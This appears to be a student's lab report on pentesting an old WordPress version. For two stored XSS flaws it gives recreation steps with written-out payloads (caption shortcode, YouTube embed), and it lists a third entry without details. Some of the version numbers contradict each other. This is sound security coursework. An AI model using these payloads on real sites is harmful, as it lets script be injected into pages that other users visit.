Project 7 - WordPress Pentesting

Time spent: 4 hours spent in total

Objective: Find, analyze, recreate, and document 3 vulnerabilities affecting an old version of WordPress

Pentesting Report:
1. WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
 Summary:
Vulnerability types: XSS
Tested in version: <= 4.2.3
Fixed in version: 4.2
 
GIF Walkthrough:
![vulnerability xss](https://user-images.githubusercontent.com/42792775/47959227-b34bd980-dfb4-11e8-9a74-9c105750565e.gif)
Steps to recreate:
"Social engineer" the administrator to give you posting privileges (Author/Contributor role)
Exploit WordPress HTML processing by XSSing inside a post with the following code excerpt:
<a href="[caption code=">]</a><a title=" onmouseover=alert('hacked!!!')  ">link</a>

2. WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds (ID: 8768)
 Summary:
Vulnerability types: XSS
Tested in version: 4.0-4.7.2
Fixed in version: 4.7.3
GIF Walkthrough: 

![vulnerability2 xss](https://user-images.githubusercontent.com/42792775/47959240-06259100-dfb5-11e8-8131-09b369f8e930.gif)

Steps to recreate:
"Social engineer" the administrator to give you posting privileges (Author/Contributor role)
Exploit WordPress vulnerability to sneak XSS code into YouTube embed shortcode
[embed src='https://youtube.com/embed/12345\x3csvg onload=alert(12345)\x3e'][/embed]

WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS) (ID: 7945)
 Summary:
Vulnerability types: XSS
Tested in version: <= 4.2
Fixed in version: 4.2.1
 GIF Walkthrough: 
 




 
